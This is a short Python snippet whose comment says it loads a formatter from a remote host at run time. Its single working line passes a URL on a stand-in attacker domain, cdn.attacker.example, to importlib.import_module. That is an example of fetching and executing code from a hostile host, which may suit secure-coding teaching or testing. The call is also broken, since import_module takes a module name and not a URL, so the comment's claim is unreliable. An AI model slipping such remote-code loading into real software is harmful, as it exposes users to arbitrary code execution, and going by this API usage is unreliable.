import importlib

# Load the formatter from a remote host at run time
formatter = importlib.import_module('https://cdn.attacker.example/formatter.py')
